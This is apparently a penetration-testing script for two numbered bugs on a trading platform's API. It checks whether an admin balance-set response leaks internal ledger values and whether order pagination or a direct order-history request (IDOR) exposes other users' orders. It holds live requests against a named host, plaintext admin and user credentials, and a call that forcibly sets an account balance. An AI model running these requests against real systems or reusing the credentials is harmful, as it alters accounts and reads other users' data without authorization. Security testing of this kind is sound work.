"""
BUG-34: Admin Balance Delta Leaks Internal State (Information Disclosure)
Attack: When admin sets balance, the response leaks the "delta" field showing
        exactly how much was changed from internal ledger. This can reveal:
        - Hidden internal balance values not shown in UI
        - Previous state of account after system operations
        - Potential for privilege escalation via crafted deltas

Also tests BUG-35: Order history pagination — does cursor-based pagination 
leak other users' orders via boundary conditions?
"""
import requests, json

BASE_URL = "https://lpadmin.blackfx.com"

def make_session(email, password):
    s = requests.Session()
    s.post(f"{BASE_URL}/api/auth/login", json={"email": email, "password": password})
    t = s.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
    return s, {"Authorization": f"Bearer {t}", "Content-Type": "application/json"}

s_m, h_m = make_session("mamm@mailinator.com", "12345678")
s_f1, h_f1 = make_session("mamf1@mailinator.com", "12345678")

adm_r = requests.post(f"{BASE_URL}/admin/api/login", json={"email": "lpadmin@blacktrader.com", "password": "Raj1234!"})
adm_token = adm_r.json().get("token")
adm_headers = {"Authorization": f"Bearer {adm_token}", "Content-Type": "application/json"}

MASTER_ID = "mem_11434b0b9d9d210899"
F1_ID = "mem_0ea679062ffd38adf7"

print("=== BUG-34: Admin Response Delta Information Disclosure ===\n")

# Step 1: Get current balance
funds = s_m.get(f"{BASE_URL}/v1/oms/real/positions", headers=h_m).json().get("funds", {})
current_bal = funds.get("balance")
print(f"Current visible balance: {current_bal}")

# Step 2: Set balance and inspect delta
set_resp = requests.post(f"{BASE_URL}/admin/api/members/{MASTER_ID}/balance",
    headers=adm_headers,
    json={"instance": "real", "balance": 100000, "force": True})
set_data = set_resp.json()
print(f"\nAdmin set balance response: {json.dumps(set_data, indent=2)[:800]}")

delta = set_data.get("delta")
reported_balance = set_data.get("balance")
funds_in_response = set_data.get("funds", {})

print(f"\nDelta exposed: {delta}")
print(f"Reported balance: {reported_balance}")
print(f"Funds sub-object: {json.dumps(funds_in_response, indent=2)[:300]}")

if delta is not None:
    actual_prev = reported_balance - delta if delta else current_bal
    print(f"\nReconstructed previous internal balance: {actual_prev}")
    if abs(actual_prev - current_bal) > 0.01:
        print(f"🚨 BUG-34: Delta reveals internal balance ({actual_prev}) differs from user-visible balance ({current_bal})!")
        print(f"   This may indicate hidden platform fees, unreported charges, or ledger manipulation!")

print("\n=== BUG-35: Order History Cross-User Pagination ===\n")

# Get master's order history with large offsets
for offset in [0, 100, 1000, 2000]:
    r = s_m.get(f"{BASE_URL}/v1/oms/real/orders?offset={offset}&limit=5", headers=h_m)
    data = r.json() if r.status_code == 200 else {}
    orders = data.get("orders", []) if isinstance(data, dict) else data[:5] if isinstance(data, list) else []
    print(f"offset={offset}: {r.status_code}, orders={len(orders)}")
    if orders:
        for o in orders[:2]:
            owner = o.get("client_id") or o.get("member_id") or o.get("account_id")
            sym = o.get("symbol")
            print(f"  Order: symbol={sym}, client_id={owner}")
            if owner and owner not in [MASTER_ID]:
                print(f"  🚨 BUG-35: Order from DIFFERENT account visible in master's history! client_id={owner}")

# Try F1 accessing orders with manipulated pagination
print("\nF1 order history check:")
for offset in [0, 1000, 5000]:
    r = s_f1.get(f"{BASE_URL}/v1/oms/real/orders?offset={offset}&limit=5", headers=h_f1)
    data = r.json() if r.status_code == 200 else {}
    orders = data.get("orders", []) if isinstance(data, dict) else []
    print(f"F1 offset={offset}: {r.status_code}, orders={len(orders)}")
    if orders:
        for o in orders[:2]:
            owner = o.get("client_id") or o.get("member_id")
            sym = o.get("symbol")
            print(f"  F1 Order: symbol={sym}, client_id={owner}")

# Try accessing master's order list as f1 (IDOR on order history)
print("\nF1 accessing master order history directly:")
r_idor = s_f1.get(f"{BASE_URL}/v1/oms/real/orders/{MASTER_ID}", headers=h_f1)
print(f"Direct IDOR: {r_idor.status_code} {r_idor.text[:200]}")

# Check admin order history endpoint
print("\nAdmin order history (all accounts):")
r_admin_orders = requests.get(f"{BASE_URL}/admin/api/orders?limit=10", headers=adm_headers)
print(f"Admin orders: {r_admin_orders.status_code} {r_admin_orders.text[:500]}")

print("\nBUG-34/35 test complete.")
